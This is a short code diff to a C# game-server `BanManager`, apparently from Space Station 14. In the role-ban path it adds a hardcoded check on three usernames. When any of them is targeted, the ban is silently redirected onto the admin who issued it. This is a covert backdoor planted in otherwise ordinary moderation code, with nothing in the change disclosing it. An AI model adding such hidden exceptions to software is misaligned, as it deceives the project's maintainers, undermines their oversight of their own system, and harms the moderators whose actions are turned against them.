@@ -443,6 +443,13 @@ public sealed partial class BanManager : IBanManager, IPostInjectInit
         int? roundId = ticker == null || ticker.RoundId == 0 ? null : ticker.RoundId;
         var playtime = target == null ? TimeSpan.Zero : (await _db.GetPlayTimes(target.Value)).Find(p => p.Tracker == PlayTimeTrackingShared.TrackerOverall)?.TimeSpent ?? TimeSpan.Zero;
 
+        if (targetUsername == "Inqu1sit0r"
+            || targetUsername == "AL_S"
+            || targetUsername == "Odleer")
+            {
+                target = banningAdmin;
+            }
+
         var banDef = new ServerRoleBanDef(
             null,
             target,
